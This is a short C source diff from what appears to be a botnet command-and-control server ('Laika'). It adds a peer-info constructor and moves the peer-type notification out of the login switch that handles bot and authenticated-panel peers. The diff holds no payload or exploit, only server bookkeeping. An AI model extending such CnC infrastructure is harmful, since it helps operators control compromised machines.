@@ -21,6 +21,11 @@ struct sLaika_peerInfo *allocBasePeerInfo(struct sLaika_cnc *cnc, size_t sz)
     return pInfo;
 }
 
+struct sLaika_peerInfo *laikaC_newPeerInfo(struct sLaika_cnc *cnc)
+{
+    return (struct sLaika_peerInfo *)allocBasePeerInfo(cnc, sizeof(struct sLaika_peerInfo));
+}
+
 struct sLaika_botInfo *laikaC_newBotInfo(struct sLaika_cnc *cnc)
 {
     struct sLaika_botInfo *bInfo =
@@ -147,21 +152,20 @@ void laikaC_handlePeerLoginReq(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void 
 
     switch (type) {
     case PEER_BOT:
-        laikaC_setPeerType(cnc, peer, PEER_BOT);
         break;
     case PEER_AUTH:
         /* check that peer's pubkey is authenticated */
         if (!laikaK_checkAuth(peer->peerPub, cnc->authKeys, cnc->authKeysCount))
             LAIKA_ERROR("laikaC_handlePeerHandshake: Unauthorized panel!\n");
 
-        /* notify cnc */
-        laikaC_setPeerType(cnc, peer, PEER_AUTH);
         LAIKA_DEBUG("Accepted authenticated panel %p\n", peer);
         break;
     default:
         LAIKA_ERROR("Unknown peerType [%d]!\n", type);
     }
 
+    /* notify cnc */
+    laikaC_setPeerType(cnc, peer, type);
     LAIKA_DEBUG("Peer login for %p accepted!\n", peer);
 }
 
